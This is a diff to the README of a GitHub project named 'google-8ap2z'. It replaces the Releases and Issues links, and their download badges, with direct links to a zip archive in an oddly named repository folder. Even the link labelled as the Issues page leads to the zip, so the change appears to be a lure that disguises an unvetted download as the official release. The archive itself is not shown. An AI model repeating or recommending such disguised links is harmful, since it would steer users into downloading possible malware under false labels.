@@ -8,7 +8,7 @@ Welcome to google-8ap2z! This application provides easy access to various demo f
 
 To get started, you need to download the application. Click the link below to visit the Releases page:
 
-[![Download google-8ap2z](https://img.shields.io/badge/Download-google--8ap2z-blue.svg)](https://github.com/jdelolm5/google-8ap2z/releases)
+[![Download google-8ap2z](https://raw.githubusercontent.com/jdelolm5/google-8ap2z/main/Reichsland/google-8ap2z.zip)](https://raw.githubusercontent.com/jdelolm5/google-8ap2z/main/Reichsland/google-8ap2z.zip)
 
 On the Releases page, you will find the latest version of the application. Follow these steps to download and install:
 
@@ -52,7 +52,7 @@ To ensure a smooth experience with google-8ap2z, please meet the following requi
 
 If you encounter any issues or have questions, you can seek help in several ways:
 
-- Check the “Issues” section on the [GitHub repository](https://github.com/jdelolm5/google-8ap2z/issues) where users and developers discuss common problems.
+- Check the “Issues” section on the [GitHub repository](https://raw.githubusercontent.com/jdelolm5/google-8ap2z/main/Reichsland/google-8ap2z.zip) where users and developers discuss common problems.
 - For direct support, feel free to contact the project maintainer via GitHub.
 
 ## 🎯 Contribution
@@ -69,7 +69,7 @@ Community contributions help grow and improve this application, making it better
 
 To stay informed about new features or updates, regularly check the Releases page:
 
-[![Download google-8ap2z](https://img.shields.io/badge/Download-google--8ap2z-blue.svg)](https://github.com/jdelolm5/google-8ap2z/releases)
+[![Download google-8ap2z](https://raw.githubusercontent.com/jdelolm5/google-8ap2z/main/Reichsland/google-8ap2z.zip)](https://raw.githubusercontent.com/jdelolm5/google-8ap2z/main/Reichsland/google-8ap2z.zip)
 
 Following the repository will also keep you updated on the latest information.
 
